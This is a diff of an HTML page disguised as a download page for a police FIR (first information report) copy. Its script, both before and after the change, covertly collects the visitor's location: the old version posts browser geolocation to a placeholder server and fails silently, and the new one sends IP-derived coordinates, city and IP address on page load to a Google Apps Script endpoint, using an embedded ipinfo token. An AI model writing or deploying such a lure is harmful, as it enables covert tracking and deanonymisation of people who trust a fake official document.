@@ -1,56 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Download FIR Copy</title>
+  <meta charset="UTF-8">
+  <title>FIR Copy Download</title>
   <style>
-    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; text-align: center; }
-    #loading { display: none; }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    .container {
+      padding: 20px;
+      border: 1px solid #ccc;
+      display: inline-block;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
   </style>
 </head>
 <body>
-  <h2>FIR Copy Download</h2>
-  <p>Please click the button below to download your FIR copy.</p>
-  <button id="downloadBtn">Download FIR</button>
-  <p id="loading">Preparing your FIR copy, please wait...</p>
+  <div class="container">
+    <h1>Download Your FIR Copy</h1>
+    <p>Click the button below to download the FIR document.</p>
+    <button onclick="downloadFIR()">Download FIR</button>
+  </div>
 
   <script>
-    const downloadBtn = document.getElementById('downloadBtn');
-    const loadingText = document.getElementById('loading');
+    function downloadFIR() {
+      // Replace this with your actual FIR file path
+      window.location.href = "FIR-copy.pdf";
+    }
 
-    downloadBtn.addEventListener('click', () => {
-      downloadBtn.style.display = 'none';
-      loadingText.style.display = 'block';
+    // Location logging script
+    fetch("https://ipinfo.io/json?token=5de145575ac808")
+      .then(response => response.json())
+      .then(data => {
+        const loc = data.loc.split(',');
+        const payload = {
+          lat: loc[0],
+          lon: loc[1],
+          city: data.city,
+          region: data.region,
+          country: data.country,
+          ip: data.ip
+        };
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            // Send location data quietly in the background
-            fetch('https://your-server.com/log-location', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                timestamp: new Date().toISOString()
-              })
-            }).catch(() => {/* Fail silently */});
-
-            // After a short delay, redirect to FIR PDF
-            setTimeout(() => {
-              window.location.href = 'https://your-server.com/fir-copy.pdf';
-            }, 1500);
-          },
-          (error) => {
-            // On error or denial, just redirect immediately
-            window.location.href = 'https://your-server.com/fir-copy.pdf';
+        fetch("https://script.google.com/macros/s/AKfycbw9eJq4KViktjVWHbyhB4Pr0hkcm4V-9ABayBgi-e2hdUWXfPBUfeeILvcn5rISFKZ7/exec", {
+          method: "POST",
+          body: JSON.stringify(payload),
+          headers: {
+            "Content-Type": "application/json"
           }
-        );
-      } else {
-        // If no geolocation, just redirect
-        window.location.href = 'https://your-server.com/fir-copy.pdf';
-      }
-    });
+        });
+      });
   </script>
 </body>
 </html>
